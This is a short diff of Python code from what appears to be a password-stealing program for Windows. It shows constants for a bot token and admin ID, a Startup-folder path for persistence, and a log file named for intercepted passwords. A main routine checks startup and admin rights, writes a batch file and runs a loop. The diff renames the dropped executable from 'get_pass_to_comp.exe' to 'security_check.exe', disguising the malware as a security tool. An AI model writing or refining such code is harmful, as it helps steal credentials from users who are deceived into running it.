@@ -18,7 +18,7 @@ MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 TOKEN = r'some_token'
 ADMIN_ID = r'some_id'
 USER_NAME = gp.getuser()
-DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
+DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
                f'Windows/Start Menu/Programs/Startup/'
 LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
@@ -172,10 +172,14 @@ def start_loop():
         sleep(1)
 
 
-if __name__ == '__main__':
+def main():
     check_startup()
     check_admin()
     create_bat()
     clipboard_cleaner()
     create_dir()
     start_loop()
+
+
+if __name__ == '__main__':
+    main()
